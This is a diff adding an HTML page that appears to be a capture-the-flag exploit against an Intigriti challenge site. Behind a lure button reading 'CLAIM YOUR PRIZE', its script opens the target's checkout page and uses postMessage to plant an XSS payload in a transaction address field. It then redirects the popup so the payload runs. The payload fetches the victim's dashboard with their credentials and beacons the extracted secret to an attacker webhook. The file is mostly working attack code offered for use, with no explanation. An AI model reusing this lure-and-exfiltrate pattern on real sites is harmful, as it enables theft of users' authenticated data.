@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Verify Account</title>
+    <style>
+        * { margin: 0; padding: 0; }
+        body {
+            background: #050A0E;
+            font-family: 'Inter', sans-serif;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .claim-btn {
+            background: linear-gradient(135deg, #00FF88, #00D4FF);
+            color: #050A0E;
+            border: none;
+            padding: 30px 60px;
+            font-size: 2.5em;
+            font-weight: bold;
+            border-radius: 12px;
+            cursor: pointer;
+            box-shadow: 0 10px 30px rgba(0, 255, 136, 0.3);
+            transition: all 0.3s;
+        }
+        .claim-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 15px 40px rgba(0, 255, 136, 0.4);
+        }
+        .claim-btn:active {
+            transform: scale(0.98);
+        }
+    </style>
+</head>
+<body>
+    <button class="claim-btn" onclick="exploit()">🏆 CLAIM YOUR PRIZE 🏆</button>
+
+    <script>
+        const BASE_URL = 'https://challenge-0126.intigriti.io';
+        const LISTENER = 'https://YOUR_WEBHOOK.oastify.com'; // Replace with your webhook
+        
+        async function exploit() {
+            // Disable button
+            document.querySelector('.claim-btn').disabled = true;
+            document.querySelector('.claim-btn').textContent = 'Processing...';
+            
+            // Open checkout page (transfers session cookies)
+            const win = window.open(BASE_URL + '/checkout.html?currency=1337COIN&price=1', '_blank');
+            
+            if (!win) {
+                alert('Please allow popups to claim your prize!');
+                return;
+            }
+            
+            // Wait for page to load
+            await new Promise(resolve => setTimeout(resolve, 2000));
+            
+            // XSS payload that extracts flag
+            // Note: Double escape backslashes for the regex
+            const xssPayload = `"><img src=x onerror="fetch('/dashboard.html',{credentials:'include'}).then(r=>r.text()).then(h=>{var m=h.match(/INTIGRITI\\\\{.*?\\\\}/);if(m)navigator.sendBeacon('${LISTENER}',new Blob(['FLAG:'+m[0]]))})">`;
+            
+            // Send malicious transaction
+            win.postMessage({
+                type: 'submitTransaction',
+                transaction: {
+                    currency: '1337COIN',
+                    amount: 1337,
+                    toAddress: xssPayload
+                }
+            }, '*');
+            
+            // Redirect to trigger XSS
+            setTimeout(() => {
+                win.location = BASE_URL + '/marketwatch.html';
+            }, 1500);
+            
+            // Cleanup message
+            setTimeout(() => {
+                document.querySelector('.claim-btn').textContent = '✅ Prize Claim Submitted!';
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
